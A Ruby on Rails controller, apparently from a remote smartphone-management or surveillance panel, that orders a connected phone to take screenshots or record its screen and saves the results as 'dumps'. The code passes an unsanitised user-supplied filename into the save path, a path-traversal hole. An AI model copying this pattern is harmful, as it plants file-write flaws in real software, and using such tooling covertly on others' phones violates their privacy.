class ScreenshotsController < InheritedResources::Base
  include CommandSender
  
  def dump_screen_snap
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      currentTime = DateTime.now
      currentTimeFormat = currentTime.strftime("%Y-%m-%d_%H--%M--%S")
      fileName = params[:filename].to_s
      @fileName = fileName.empty? ? "screen_snap_#{currentTimeFormat}.png" : "#{fileName}.png"
      
      # Send take_screenshot command via ActionCable
      pending_command = send_command_and_wait(@smartphone, 'take_screenshot', {}, timeout: 30.seconds)
      
      if pending_command.completed? && pending_command.response_data['image_base64'].present?
        # Decode Base64 and save screenshot
        image_bytes = Base64.decode64(pending_command.response_data['image_base64'])
        file_path = Rails.root.join('files', 'dumps', 'screen_snaps', @fileName)
        FileUtils.mkdir_p(File.dirname(file_path))
        File.binwrite(file_path, image_bytes)
        
        # Save to database
        Screenshot.create!(
          date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
          filename: @fileName,
          smartphone_id: @smartphone.id
        )
        
        commandOutput = ["Screenshot captured: #{@fileName} (#{pending_command.response_data['size']} bytes)"]
      else
        error_msg = pending_command.response_data&.dig('error') || 'No screenshot data received'
        commandOutput = ["Operation Failed: #{error_msg}"]
      end
      
    rescue => e
      Rails.logger.error("Error taking screenshot: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "dump_screen_snap", locals: { commandOutput: commandOutput, fileName: @fileName }
      }
    end
  end

  def screen_record
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      duration = params[:time].present? ? params[:time].to_i : 30
      fileName = params[:filename].to_s
      currentTime = DateTime.now
      currentTimeFormat = currentTime.strftime("%Y-%m-%d_%H--%M--%S")
      @fileName = fileName.empty? ? "screen_record_#{currentTimeFormat}.mp4" : "#{fileName}.mp4"
      
      # Send start_screen_record command
      start_cmd = send_command_and_wait(@smartphone, 'start_screen_record', { duration: duration }, timeout: 5.seconds)
      
      if start_cmd.completed?
        # Wait for recording to complete (duration + buffer)
        sleep(duration + 2)
        
        # Send stop_screen_record command
        stop_cmd = send_command_and_wait(@smartphone, 'stop_screen_record', {}, timeout: 60.seconds)
        
        if stop_cmd.completed? && stop_cmd.response_data['video_base64'].present?
          # Decode Base64 and save video
          video_bytes = Base64.decode64(stop_cmd.response_data['video_base64'])
          file_path = Rails.root.join('files', 'dumps', 'screen_snaps', @fileName)
          FileUtils.mkdir_p(File.dirname(file_path))
          File.binwrite(file_path, video_bytes)
          
          # Save to database
          Screenshot.create!(
            date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
            filename: @fileName,
            smartphone_id: @smartphone.id
          )
          
          commandOutput = ["Screen recording saved: #{@fileName} (#{stop_cmd.response_data['size']} bytes)"]
        else
          commandOutput = ["Recording failed: No video data received"]
        end
      else
        commandOutput = ["Failed to start screen recording"]
      end
      
    rescue => e
      Rails.logger.error("Error recording screen: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "screen_record", locals: { commandOutput: commandOutput, fileName: @fileName }
      }
    end
  end

  private

  def screenshot_params
    params.require(:screenshot).permit(:date,
                                       :duration,
                                       :filename,
                                       :smartphone_id)
  end
end
